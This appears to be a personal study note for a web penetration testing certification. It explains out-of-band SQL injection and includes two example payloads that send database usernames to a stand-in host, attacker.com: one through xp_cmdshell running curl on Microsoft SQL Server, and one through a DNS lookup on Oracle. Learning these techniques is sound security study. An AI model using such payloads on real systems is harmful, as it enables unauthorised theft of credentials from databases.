2025-06-24 14:41

Status:

Tags: [[eWPT]] [[SQL Injection]]
###### Prerequisites: 
# Out-of-Band SQL Injection

**Out-of-Band SQL Injection**  
This is the **least common** type of SQL injection and is only possible when certain features are enabled on the database server (e.g., making HTTP or DNS requests).

Unlike **in-band** SQL injection (where data is sent and received through the same channel), **out-of-band** SQL injection uses a **different communication channel** to exfiltrate data — like an attacker-controlled **web server** or via **DNS requests**.

---

### How it works:

- The attacker sends a specially crafted SQL payload to the application.
    
- Instead of receiving a direct response, the **database makes an outbound request** (e.g., HTTP or DNS) to an external server controlled by the attacker.
    
- The request carries sensitive data such as usernames or passwords.
    

---

### Example 1: **Using HTTP Requests** (for Microsoft SQL Server)

```sql
'; EXEC xp_cmdshell('curl http://attacker.com?data=' + (SELECT TOP 1 username FROM users)) -- 
```

- This command causes the database to make an HTTP request to `attacker.com`, appending the first username in the URL.
    
- The attacker monitors their server logs and captures the value.
    

---

### Example 2: **Using DNS Exfiltration** (for Oracle)

```sql
'; SELECT UTL_INADDR.get_host_address((SELECT username FROM users WHERE ROWNUM = 1)||'.attacker.com') FROM dual --
```

- This payload causes the database to perform a **DNS lookup** to something like:  
    `admin.attacker.com`
    
- The attacker then checks their DNS logs to capture `admin`.
    

---

### When is it used?

- When **no visible response** or **error messages** are returned by the app.
    
- When **time-based** or **boolean-based blind injection** are too slow or blocked.
    
- Requires special functions or permissions (e.g., `xp_cmdshell`, `UTL_HTTP`, `UTL_INADDR`) to be enabled on the database.
    
---
![[Pics/Screenshot 2025-06-24 at 2.54.16 PM.png]]
